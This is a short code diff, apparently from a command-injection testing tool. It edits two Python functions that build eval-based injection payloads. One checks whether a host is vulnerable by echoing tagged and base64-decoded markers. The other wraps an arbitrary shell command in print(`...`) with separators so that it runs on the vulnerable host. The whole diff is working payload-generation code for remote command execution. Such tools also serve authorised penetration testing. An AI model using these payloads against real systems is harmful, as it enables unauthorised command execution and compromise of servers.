@@ -21,26 +21,30 @@
 
 # Eval-based decision payload (check if host is vulnerable).
 def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+    
   if separator == ";":
-    payload = (separator + "echo '" + TAG + "'" +
-		separator + "echo `" + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "`" +
-		separator + "echo '" + TAG + "'" +
+    payload = ("print(`echo " + TAG + "" +
+		separator + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "" +
+		separator + "echo " + TAG + "`)" +
 		separator
 	      )
   else:
     pass
+  
   return payload
 
 # Execute shell commands on vulnerable host.
 def cmd_execution(separator,TAG,cmd):
+
   if separator == ";" :
-    payload = (separator + "echo '" + TAG + "'" +
-	      separator + "echo `" + "echo " + TAG + "`" +
-	      separator + "echo `" + cmd + "`" +
-	      separator + "echo `" + "echo " + TAG + "`" +
-	      separator + "echo '" + TAG + "'" +
-	      separator
+    payload = ("print(`echo '" + TAG + "'" + 
+	        separator + "echo '" + TAG + "'" +
+		separator + cmd  +
+		separator + "echo '" + TAG + "'" +
+		separator + "echo '" + TAG + "'`)" +
+		separator
 	      )
   else:
     pass
+  
   return payload
